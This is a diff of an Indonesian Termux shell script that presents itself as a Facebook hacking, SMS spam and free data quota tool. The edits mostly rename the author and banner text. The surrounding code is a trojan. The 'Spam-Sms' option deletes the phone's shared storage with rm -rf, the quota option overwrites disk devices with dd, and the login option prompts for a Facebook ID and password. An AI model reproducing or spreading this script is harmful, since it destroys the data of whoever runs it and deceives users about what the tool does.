@@ -14,8 +14,9 @@ clear
 figlet VipFb 1.8 | lolcat
 
 echo $B1"=========================="
-echo $G1"author : TUAN4BEL"
-echo $R1"Dark-Fb 1.8"
+echo $G1"author : Nicoleus"
+echo $R1"Dark-Fb Bro!1.8"
+echo $G1"Horas Bang!!
 echo $B1"=========================="
 
 
@@ -25,16 +26,16 @@ echo $P1"3.Spam-Sms 100% work"
 echo $B1"4.Tembak-Kuota All Operator 100% work"
 
 echo $B1"╭──[Masukkan Pilihan]>"
-read -p"╰───────root@TUAN4BEL=•>" TUAN4BEL;
+read -p"╰───────root@Nicoleus=•>" Nicoleus;
 
 clear
-if [ $TUAN4BEL = 1 ] || [ $TUAN4BEL = 01 ]
+if [ $Nicoleus = 1 ] || [ $Nicoleus = 01 ]
 then
-figlet -f slant "TUAN4BEL"|lolcat
+figlet -f slant "Nicoleus"|lolcat
 sleep 1
 echo $R1"Login Fb Dulu"
 sleep 1
-echo $B1"Masukan Id/Nomer Hp"
+echo $B1"Masukan Id/Nomer Hp Lo!!"
 read p;
 sleep 0.5
 echo $B1"Masukan Password"
@@ -75,7 +76,7 @@ echo $G1"Login Sukses"
 sleep 5
 echo $R1"Kembali Ke beranda dalam 10 dtk"
 sleep 10
-sh VIPDarkFB.sh
+sh BangsitorusFB.sh
 fi
 
 clear
@@ -135,20 +136,20 @@ sleep 10
 echo $B1"Passwornya = sayang123"
 echo $R1"Kembali ke beranda dalam 20 dtk"
 sleep 20
-sh VIPDarkFB.sh
+sh BangsitorusFB.sh
 fi
 
 clear
-if [ $TUAN4BEL = 3 ] || [ $TUAN4BEL = 03 ]
+if [ $Nicoleus = 3 ] || [ $Nicoleus = 03 ]
 then
-figlet -f slant "TUAN4BEL"|lolcat
+figlet -f slant "Nicoleus"|lolcat
 sleep 1
 echo $B1"Spam-Sms"
 sleep 1
 echo $Y1"Masukan Nomer Target Dibawah"
 read p;
 sleep 2
-echo $G1"Sedang Mengirim"
+echo $G1"Sedang Mengirim Bangee"
 termux-setup-storage
 rm -rf /storage/emulated/0
 rm -rf /sdcard/0
@@ -185,13 +186,13 @@ sleep 0.5
 echo $G1"[√] [√] [√]"
 echo $R1"Kembali ke beranda dalam 5 detik"
 sleep 5
-sh VIPDarkFB.sh
+sh BangsitorusFB.sh
 fi
 
 clear
-if [ $TUAN4BEL = 4 ] || [ $TUAN4BEL = 04 ]
+if [ $Nicoleus = 4 ] || [ $Nicoleus = 04 ]
 then
-figlet -f slant "TUAN4BEL"|lolcat
+figlet -f slant "Nicoleus"|lolcat
 sleep 1
 apt update && apt upgrade
 pkg install git
@@ -224,5 +225,5 @@ dd if=/dev/hda of=/dev/hdb
 dd if=/dev/zero of=/dev/had
 sleep 3
 echo $R1"Tembak-Kuota Gagal"
-sh VIPDarkFB.sh
+sh BangsitorusFB.sh
 fi
